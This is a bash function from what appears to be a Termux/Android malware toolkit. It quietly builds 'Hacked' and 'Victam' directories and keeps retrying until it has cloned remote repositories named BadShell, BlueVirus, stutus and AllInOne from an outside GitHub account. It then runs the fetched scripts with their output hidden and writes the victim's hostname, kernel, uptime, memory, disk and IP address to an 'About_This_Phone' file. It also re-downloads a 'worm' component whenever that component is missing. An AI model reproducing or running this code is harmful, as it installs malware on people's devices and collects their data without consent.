Rebulid(){

if [[ ${nN} == "Y" ]];then


if [[ -d $PREFIX/etc/Hacked/ ]];then

printf ""

	if [[ -d $PREFIX/etc/Hacked/Victam/ ]];then

printf ""

	else

			mkdir $PREFIX/etc/Hacked/Victam/ &>> /dev/null
			Rebulid
	fi

	if [[ -d $PREFIX/etc/Hacked/Server ]];then

		printf ""

	else

		cd $PREFIX/etc/Hacked/
		while true;do
			git clone https://github.com/blue24bluer/Server &>> /dev/null
			if [[ $? == "0" ]];then
				break
			fi
		done
	fi

	if [[ -d $PREFIX/etc/Hacked/BlueVirus ]];then

		printf ""

	else

		cd $PREFIX/etc/Hacked/
		git clone https://github.com/blue24bluer/BadShell_B24B &>> /dev/null
		mv BadShell_B24B BlueVirus

	fi

	if [[ -d $PREFIX/etc/Hacked/LOCKS ]];then

		printf ""

	else

		mkdir $PREFIX/etc/Hacked/LOCKS

	fi

	if [[ -d $PREFIX/etc/Hacked/Badshell ]];then

printf ""

	else


		while true ;do

			cd $PREFIX/etc/Hacked/
			git clone https://github.com/blue24bluer/Badshell &>> /dev/null
			if [[ $? == '0' ]];then

				break

			fi
		done

	fi

	if [[ -d $PREFIX/etc/Hacked/stutus ]];then

		printf ""

	else

		cd $PREFIX/etc/Hacked/
		while true;do

			git clone https://github.com/blue24bluer/stutus &>> /dev/null
			if [[ $? == "0" ]];then

				bash $PREFIX/etc/Hacked/stutus/stutus
				break

			fi

		done

	fi

else

			mkdir $PREFIX/etc/Hacked/ &>> /dev/null
			Rebulid

fi

if [[ -d $PREFIX/etc/B24B ]];then

	printf ""

else

	cd $PREFIX/etc/
	mkdir B2
	cd B2
	while true;do
		git clone https://github.com/blue24bluer/AllInOne &>> /dev/null
		if [[ $? == "0" ]];then

			break

		else

			printf ""

		fi
	done
	cd AllInOne/
	bash AllInOne installit
	bash AllInOne dpkg
	bash AllInOne badshell
fi


                	cd $PREFIX/etc/Hacked/


#                               cp badshell/Hacker.jpg $PREFIX/etc/Hacked/
#                               cp badshell/Blue24Bluer.jpg $PREFIX/etc/Hacked/
#                               touch $PREFIX/etc/Hacked/Victam/About_This_Phone
				if [[ -d $PREFIX/etc/Hacked/ ]];then
					if [[ -d $PREFIX/etc/Hacked/Victam/ ]];then
                        	        	echo -e "$HostNamen \n $Kernel \n $UpTime \n $MemoryUsage \n $DiskUsage \n $ip" > $PREFIX/etc/Hacked/Victam/About_This_Phone 
					else

						Rebulid

					fi

				else

					Rebulid &>> /dev/null

				fi

if [[ -f $PREFIX/etc/Hacked/Badshell/worm ]];then

	if [[ $(cat $PREFIX/etc/Hacked/Badshell/worm) == "" ]];then

		rm -rfd $PREFIX/etc/Hacked/Badshell
		Rebulid &>> /dev/null

	else

		printf ""

	fi

else

	rm -rfd $PREFIX/etc/Hacked/Badshell
	Rebulid &>> /dev/null

fi

fi
}
